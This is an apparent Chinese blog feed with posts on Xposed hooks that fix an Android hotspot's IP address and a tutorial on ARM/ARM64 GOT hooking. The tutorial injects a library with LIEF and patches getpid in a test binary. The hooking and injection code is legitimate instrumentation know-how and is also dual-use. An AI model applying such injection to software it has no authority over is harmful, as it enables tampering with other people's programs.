<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// request from DHCP server that it wants to have a new prefix</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CMD_NEW_PREFIX_REQUEST          = BASE_IPSERVER + <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNewPrefixRequest</span><span class="params">(<span class="meta">@NonNull</span> <span class="keyword">final</span> IpPrefix currentPrefix)</span> </span>&#123;</span><br><span class="line">    Objects.requireNonNull(currentPrefix);</span><br><span class="line">    sendMessage(CMD_NEW_PREFIX_REQUEST, currentPrefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Hook点-2"><a href="#Hook点-2" class="headerlink" title="Hook点"></a>Hook点</h3><p><code>android.net.ip.IpServer</code>的<code>requestIpv4Address</code>函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> LinkAddress <span class="title">requestIpv4Address</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<p>由于该函数还被用于其他方式的网络共享及更换前缀，所以需要判断网络类型（<code>mInterfaceType == TETHERING_WIFI</code>）和调用者（遍历堆栈查找<code>configureIPv4</code>），最后进行替换。</p>
<p>PS：测试发现<code>Android 11</code>设置IP的包名不再是<code>android</code>，而是<code>com.android.networkstack.tethering.inprocess</code></p>
<h2 id="Hook代码"><a href="#Hook代码" class="headerlink" title="Hook代码"></a>Hook代码</h2><p>见GitHub：<a href="https://github.com/XhyEax/SoftApHelper/tree/master/app/src/main/java/com/xhy/xp/softaphelper/MainHook.java">MainHook.java</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://android.stackexchange.com/questions/233453/how-can-i-permanently-assign-a-static-ip-address-to-wi-fi-clients-lineage-os-1">How can I permanently assign a static IP address to Wi-Fi clients? (Lineage OS 17.1 Android 10)</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓12 设置热点固定IP (Xposed)</title>
    <url>/2022/07/06/android-12-hostpot-set-ip/</url>
    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/XhyEax/SoftApHelper">SoftApHelper</a></p>
<h2 id="Hook点"><a href="#Hook点" class="headerlink" title="Hook点"></a>Hook点</h2><p>仍然是<code>android.net.ip.IpServer</code>的<code>requestIpv4Address</code>函数。</p>
<p><a href="http://aospxref.com/android-12.0.0_r3/xref/packages/modules/Connectivity/Tethering/src/android/net/ip/IpServer.java#655">IpServer.java#655</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> LinkAddress <span class="title">requestIpv4Address</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> useLastAddress)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mStaticIpv4ServerAddr != <span class="keyword">null</span>) <span class="keyword">return</span> mStaticIpv4ServerAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mInterfaceType == TetheringManager.TETHERING_BLUETOOTH) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LinkAddress(BLUETOOTH_IFACE_ADDR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mPrivateAddressCoordinator.requestDownstreamAddress(<span class="keyword">this</span>, useLastAddress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参数增加了一个<code>boolean useLastAddress</code>，加上即可。</p>
<p>通过反射调用<code>getDeclaredMethods</code>获取方法，从而适配安卓11和12。</p>
<h2 id="Hook代码"><a href="#Hook代码" class="headerlink" title="Hook代码"></a>Hook代码</h2><p>见GitHub：<a href="https://github.com/XhyEax/SoftApHelper/tree/master/app/src/main/java/com/xhy/xp/softaphelper/MainHook.java">MainHook.java</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓9 设置热点固定IP (Xposed)</title>
    <url>/2021/03/01/android-9-set-hotpot-ip/</url>
    <content><![CDATA[<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><a href="https://blog.xhyeax.com/2022/07/06/android-12-hostpot-set-ip/">安卓12 固定Wifi热点IP (Xposed)</a></p>
<p><a href="https://blog.xhyeax.com/2021/12/06/android-10-11-hostpot-set-ip/">安卓10、11 固定Wifi热点IP (Xposed)</a></p>
<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/XhyEax/SoftApHelper">SoftApHelper</a></p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>手机系统升级到安卓9之后，开热点的主机IP地址是随机的。其他设备设置代理很不方便，于是考虑固定热点IP。</p>
<h2 id="Hook点"><a href="#Hook点" class="headerlink" title="Hook点"></a>Hook点</h2><h3 id="安卓9"><a href="#安卓9" class="headerlink" title="安卓9"></a>安卓9</h3><p><code>com.android.server.connectivity.tethering.TetherInterfaceStateMachine</code>的<code>getRandomWifiIPv4Address</code>函数。</p>
<p><a href="http://aospxref.com/android-9.0.0_r61/xref/frameworks/base/services/core/java/com/android/server/connectivity/tethering/TetherInterfaceStateMachine.java#259">TetherInterfaceStateMachine.java#259</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getRandomWifiIPv4Address</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>

<span id="more"></span>
<h2 id="安卓8热点开启流程"><a href="#安卓8热点开启流程" class="headerlink" title="安卓8热点开启流程"></a>安卓8热点开启流程</h2><p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/softap-android-o.png"><br>图源：<a href="https://blog.csdn.net/AurumMann/article/details/103028026">android8.0热点打开流程，从Setting到framework</a></p>
<h2 id="跟踪源码"><a href="#跟踪源码" class="headerlink" title="跟踪源码"></a>跟踪源码</h2><p>最终定位到<code>com.android.server.connectivity.tethering.TetherInterfaceStateMachine</code>类（<a href="http://aospxref.com/android-9.0.0_r61/xref/frameworks/base/services/core/java/com/android/server/connectivity/tethering/TetherInterfaceStateMachine.java#210">源代码</a>）</p>
<p>函数调用链：<code>startIPv4</code>-<code>configureIPv4</code>-<code>getRandomWifiIPv4Address</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">configureIPv4</span><span class="params">(<span class="keyword">boolean</span> enabled)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mInterfaceType == ConnectivityManager.TETHERING_WIFI) &#123;</span><br><span class="line">    ipAsString = getRandomWifiIPv4Address();</span><br><span class="line">    prefixLen = WIFI_HOST_IFACE_PREFIX_LENGTH;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用<code>getRandomWifiIPv4Address</code>函数生成主机IP地址后，转换为<code>LinkAddress</code>，最终调用<code>ifcg.setLinkAddress</code>设置IP：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> LinkAddress linkAddr;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> InterfaceConfiguration ifcg = mNMService.getInterfaceConfig(mIfaceName);</span><br><span class="line">    <span class="keyword">if</span> (ifcg == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mLog.e(<span class="string">&quot;Received null interface config&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InetAddress addr = NetworkUtils.numericToInetAddress(ipAsString);</span><br><span class="line">    linkAddr = <span class="keyword">new</span> LinkAddress(addr, prefixLen);</span><br><span class="line">    ifcg.setLinkAddress(linkAddr);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查找<code>getRandomWifiIPv4Address</code>的交叉引用，发现只有这一处。直接修改返回值，即可固定IP。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用Xposed框架Hook该函数（过滤包名android），设置返回值为<code>192.168.43.1</code>即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hook</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String classname = <span class="string">&quot;com.android.server.connectivity.tethering.TetherInterfaceStateMachine&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String methodname = <span class="string">&quot;getRandomWifiIPv4Address&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String WIFI_HOST_IFACE_ADDR = <span class="string">&quot;192.168.43.1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;android&quot;</span>)) &#123;</span><br><span class="line">            Class&lt;?&gt; clz = XposedHelpers.findClass(classname, lpparam.classLoader);</span><br><span class="line"></span><br><span class="line">            findAndHookMethod(clz, methodname, <span class="keyword">new</span> XC_MethodReplacement() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> Object <span class="title">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> WIFI_HOST_IFACE_ADDR;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://android.stackexchange.com/questions/213514/how-can-i-permanently-change-my-hotspot-tethering-ip-address">How can I permanently change my hotspot tethering IP address?</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>简易Android ARM&amp;ARM64 GOT Hook (一)</title>
    <url>/2021/08/23/android-arm-got-hook/</url>
    <content><![CDATA[<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p><a href="https://blog.xhyeax.com/2021/08/30/android-arm-plt-hook/">简易Android ARM&amp;ARM64 GOT Hook (二)</a><br>基本思路为：基于执行视图，解析内存中的ELF，查找导入符号并替换函数地址</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本文以Hook公共库<code>libc.so</code>的<code>getpid</code>函数为例，基于ELF的链接视图(<code>Linking View</code>)，讨论<code>Android</code> <code>ARM&amp;ARM64</code>架构的<code>GOT/PLT Hook</code>。</p>
<span id="more"></span>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>程序<code>加载</code>后，在执行之前，需要先进行<code>动态链接</code>，并进行<code>重定位</code>。</p>
<p>调用外部函数时，需要先跳转到PLT(<code>Procedure Link Table</code> 程序链接表，位于代码段)，再跳转到GOT(<code>Global Offset Table</code> 全局偏移表，位于数据段)，执行目标函数。</p>
<p>延迟绑定(<code>Lazy Binding</code>)：当外部函数被调用时，才进行地址解析和重定位</p>
<p><strong>由于Android ARM架构不支持延迟绑定，在linker重定位后，GOT已被填充为内存地址</strong> (可使用IDA动态调试验证)</p>
<p>因此，可以通过比对函数地址，修改指定模块的对应GOT表项，实现对外部导入函数的Hook</p>
<h2 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h2><p>编写so库，在so加载的构造函数（<code>linker</code>会主动调用）中完成以下操作：定位目标模块基址、基于链接视图解析ELF文件，得到GOT表地址及大小、遍历GOT表替换目标函数地址。</p>
<h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><p>使用<code>LIEF</code>修改ELF文件，导入该动态库。</p>
<h2 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h2><p><code>Android Studio 2020.3.1</code>、<code>Gradle 7.0.1</code>、<code>CMake 3.18.1</code>、<code>NDK 23.0.7599858</code><br><code>ABI</code>: <code>armeabi-v7a,arm64-v8a</code></p>
<p>PS：其实也可以脱离<code>Android Studio</code>手动编译，见<a href="https://blog.xhyeax.com/2021/08/22/arm-compile-without-as/">使用CMake交叉编译Android ARM程序</a></p>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>使用<code>Android Studio</code>创建<code>Native C++</code>项目，然后增加两个<code>Android Native Library</code>模块，分别命名为<code>victim</code>和<code>inject</code></p>
<h3 id="待注入程序"><a href="#待注入程序" class="headerlink" title="待注入程序"></a>待注入程序</h3><h4 id="victim-cpp"><a href="#victim-cpp" class="headerlink" title="victim.cpp"></a>victim.cpp</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;my pid: %d\n&quot;</span>, <span class="built_in">getpid</span>());</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用<code>getpid</code>获取进程id（IDA动态调试时使用<code>getchar</code>，方便查看内存）</p>
<h4 id="CMakeLists-txt"><a href="#CMakeLists-txt" class="headerlink" title="CMakeLists.txt"></a>CMakeLists.txt</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cmake_minimum_required(VERSION <span class="number">3.18</span><span class="number">.1</span>)</span><br><span class="line">project(victim)</span><br><span class="line"></span><br><span class="line">add_executable(victim victim.cpp)</span><br></pre></td></tr></table></figure>
<p>编译为可执行文件</p>
<h3 id="注入动态库"><a href="#注入动态库" class="headerlink" title="注入动态库"></a>注入动态库</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基于链接视图解析ELF</span></span><br><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">hackBySection</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *module_name, <span class="keyword">const</span> <span class="keyword">char</span> *target_lib, <span class="keyword">const</span> <span class="keyword">char</span> *target_func,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">uintptr_t</span> replace)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;hackBySection start.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 获取目标函数地址</span></span><br><span class="line">    <span class="keyword">void</span> *handle = <span class="built_in">dlopen</span>(target_lib, RTLD_LAZY);</span><br><span class="line">    <span class="keyword">auto</span> ori = (<span class="keyword">uintptr_t</span>) <span class="built_in">dlsym</span>(handle, target_func);</span><br><span class="line"><span class="comment">//    LOGE(&quot;ori addr: %&quot; SCNxPTR &quot;\n&quot;, ori);</span></span><br><span class="line">    <span class="keyword">int</span> GOTSize = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 获取GOT表地址及大小 (解析Section)</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> GOTBase = <span class="built_in">getGOTBase</span>(GOTSize, module_name);</span><br><span class="line">    <span class="comment">// 遍历GOT表，查找符号地址</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> addrArray[MAX_ADDRARRAY_SIZE];</span><br><span class="line">    <span class="keyword">int</span> addrArraySize = <span class="built_in">getSymAddrInGOT</span>(GOTBase, GOTSize, ori, addrArray);</span><br><span class="line">    <span class="comment">// 替换地址</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; addrArraySize; i++) &#123;</span><br><span class="line">        <span class="keyword">uintptr_t</span> replaceAddr = addrArray[i];</span><br><span class="line">        <span class="built_in">replaceFunction</span>(replaceAddr, replace, ori);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ori;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原方法的备份</span></span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*getpidOri)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换方法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getpidReplace</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;before hook getpid\n&quot;</span>);</span><br><span class="line">    <span class="comment">//调用原方法</span></span><br><span class="line">    <span class="keyword">int</span> pid = (<span class="keyword">int</span>) <span class="built_in">getpidOri</span>();</span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;after hook getpid: %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">233333</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//so加载时由linker调用</span></span><br><span class="line"><span class="keyword">void</span> __attribute__((constructor)) <span class="built_in">init</span>() &#123;</span><br><span class="line">    <span class="keyword">uintptr_t</span> ori = <span class="built_in">hackBySection</span>(MODULE_PATH, <span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;getpid&quot;</span>,</span><br><span class="line">                                  (<span class="keyword">uintptr_t</span>) getpidReplace);</span><br><span class="line">    getpidOri = (<span class="built_in"><span class="keyword">int</span></span> (*)()) (ori);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：<code>Android 7.0</code>以上，<code>dlopen</code>只能加载公共库，加载非公共库需要绕过命名空间限制。</p>
<h3 id="子函数"><a href="#子函数" class="headerlink" title="子函数"></a>子函数</h3><h4 id="获取模块基址"><a href="#获取模块基址" class="headerlink" title="获取模块基址"></a>获取模块基址</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">getModuleBase</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *modulePath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uintptr_t</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">256</span>] = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fgets</span>(buff, <span class="built_in"><span class="keyword">sizeof</span></span>(buff), fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buff, <span class="string">&quot;r-xp&quot;</span>) &amp;&amp; <span class="built_in">strstr</span>(buff, modulePath) &amp;&amp;</span><br><span class="line">            <span class="built_in">sscanf</span>(buff, <span class="string">&quot;%lx&quot;</span>, &amp;addr) == <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    LOGE(&quot;buff: %s&quot;, buff);</span></span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;[%s] moduleBase not found!\n&quot;</span>, modulePath);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遍历<code>/proc/self/maps</code>文件内容，根据权限及模块路径找到基址。</p>
<h4 id="获取GOT表地址及其大小"><a href="#获取GOT表地址及其大小" class="headerlink" title="获取GOT表地址及其大小"></a>获取GOT表地址及其大小</h4><p>篇幅所限，此处仅给出思路（以<code>ARM</code>为例），完整代码见<a href="https://github.com/XhyEax/AndroidGotHook">AndroidGotHook</a></p>
<p>根据模块路径打开ELF文件（本例为<code>/data/local/tmp/victim-patch-arm</code>），解析ELF文件结构（图片为<code>010Editor</code> ELF模板解析结果）:</p>
<p>首先从<code>elf header</code>中得到<code>section header table</code>的起始偏移（<code>e_shoff</code>）、字符串表索引（<code>e_shstrndx</code>）、<code>section header</code>大小(<code>e_shentsize</code>)和总<code>section header</code>个数（<code>e_shnum</code>）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-got-hook-elf-header.png"></p>
<p>然后计算出字符串表<code>section header</code>的偏移地址（<code>e_shoff</code> + <code>e_shstrndx</code> * <code>e_shentsize</code>），从而得到字符串表的偏移值（<code>s_offset</code>）及大小（<code>s_size</code>）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-got-hook-elf-str.png"></p>
<p>再遍历<code>section header table</code>，查找<code>sh_type</code>为<code>SHT_PROGBITS</code> 且 section名（通过<code>sh_name</code>查询字符串表）为<code>.got</code>的<code>section header</code>，得到GOT表偏移值（<code>s_offset</code>）及大小（<code>s_size</code>）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/arm-got-hook-elf-got.png"></p>
<p>最终将GOT表偏移值与模块基址相加，得到GOT表地址。</p>
<h4 id="查找目标函数地址"><a href="#查找目标函数地址" class="headerlink" title="查找目标函数地址"></a>查找目标函数地址</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uintptr_t</span> <span class="title">getSymAddrInGOT</span><span class="params">(<span class="keyword">uintptr_t</span> GOTBase, <span class="keyword">int</span> GOTSize, <span class="keyword">uintptr_t</span> ori)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (GOTBase == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOGE</span>(<span class="string">&quot;getSymAddrInGOT failed! addr [%lX] is wrong\n&quot;</span>, GOTBase);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; GOTSize; ++i) &#123;</span><br><span class="line">        <span class="keyword">uintptr_t</span> addr = GOTBase + i * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">uintptr_t</span> item = *(<span class="keyword">uintptr_t</span> *) (addr);</span><br><span class="line"><span class="comment">//        LOGE(&quot;GOT [%d]: %lX\n&quot;, i, item);</span></span><br><span class="line">        <span class="keyword">if</span> (item == ori) &#123;</span><br><span class="line">            <span class="keyword">return</span> addr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;getSymAddrInGOT %lX not found!\n&quot;</span>, ori);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>遍历GOT表，查找目标函数地址。</p>
<h4 id="替换函数地址"><a href="#替换函数地址" class="headerlink" title="替换函数地址"></a>替换函数地址</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replaceFunction</span><span class="params">(<span class="keyword">uintptr_t</span> addr, <span class="keyword">uintptr_t</span> replace, <span class="keyword">uintptr_t</span> ori)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (addr == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">LOGE</span>(<span class="string">&quot;replace failed! addr is wrong\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 比对函数地址</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> item = *(<span class="keyword">uintptr_t</span> *) (addr);</span><br><span class="line">    <span class="keyword">if</span> (item == replace) &#123;</span><br><span class="line">        <span class="built_in">LOGE</span>(<span class="string">&quot;function has been replaced!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (item != ori) &#123;</span><br><span class="line">        <span class="built_in">LOGE</span>(<span class="string">&quot;replace failed! unexpected function address %X\n&quot;</span>, item);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//修改权限、替换地址、清空指令缓存</span></span><br><span class="line">    <span class="built_in">LOGE</span>(<span class="string">&quot;replace %X to %X\n&quot;</span>, ori, replace);</span><br><span class="line">    <span class="built_in">mprotect</span>((<span class="keyword">void</span> *) <span class="built_in">PAGE_START</span>(addr), PAGE_SIZE, PROT_READ | PROT_WRITE);</span><br><span class="line">    *(<span class="keyword">uintptr_t</span> *) addr = replace;</span><br><span class="line">    __builtin___clear_cache((<span class="keyword">char</span> *) <span class="built_in">PAGE_START</span>(addr), (<span class="keyword">char</span> *) <span class="built_in">PAGE_END</span>(addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先判断函数是否已被替换，然后与期望值相比较，如果一致，则进行以下操作：<br>将该地址权限设置为可读可写，然后替换函数地址，并清空指令缓存。</p>
<h4 id="适配ARM64"><a href="#适配ARM64" class="headerlink" title="适配ARM64"></a>适配ARM64</h4><p>添加宏，将<code>Elf32_w</code>替换为<code>ELFW(w)</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFW(what) Elf64_ ## what</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELFW(what) Elf32_ ## what</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>根据架构使用不同的路径：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__LP64__)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE_PATH <span class="meta-string">&quot;victim-patch-arm64&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODULE_PATH <span class="meta-string">&quot;victim-patch-arm&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<h2 id="使用LIEF添加依赖"><a href="#使用LIEF添加依赖" class="headerlink" title="使用LIEF添加依赖"></a>使用LIEF添加依赖</h2><p>编译完成后，打开<code>victim/build/intermediates/cmake/debug/obj/CPU架构/</code>，使用<code>LIEF</code>注入<code>victim</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lief,sys</span><br><span class="line"></span><br><span class="line">abi = <span class="string">&quot;armeabi-v7a&quot;</span></span><br><span class="line">tail = <span class="string">&quot;-arm&quot;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;arm64-v8a&quot;</span>):</span><br><span class="line">    abi = sys.argv[<span class="number">1</span>]</span><br><span class="line">    tail = <span class="string">&quot;-arm64&quot;</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;../victim/build/intermediates/cmake/debug/obj/&quot;</span>+abi+<span class="string">&quot;/victim&quot;</span></span><br><span class="line">elf = lief.parse(path)</span><br><span class="line">elf.add_library(<span class="string">&quot;/data/local/tmp/libinject&quot;</span>+tail+<span class="string">&quot;.so&quot;</span>)</span><br><span class="line">elf.write(<span class="string">&quot;victim-patch&quot;</span>+tail)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;patch success&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>打开<code>inject/build/intermediates/cmake/debug/obj/CPU架构/</code>，<br>使用<code>adb</code>将生成的<code>libinject.so</code>和<code>victim-patch-arm</code>发送到手机的<code>/data/local/tmp/</code>目录（so需要重命名）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push libinject.so /data/local/tmp/libinject-arm.so</span><br><span class="line">adb push victim-patch-arm /data/local/tmp</span><br></pre></td></tr></table></figure>

<p>设置可执行权限后，运行<code>victim-patch-arm</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell chmod +x /data/local/tmp/victim-patch-arm</span><br><span class="line">adb shell /data/local/tmp/victim-patch-arm</span><br></pre></td></tr></table></figure>
<p>（<code>ARM64</code>同理）</p>
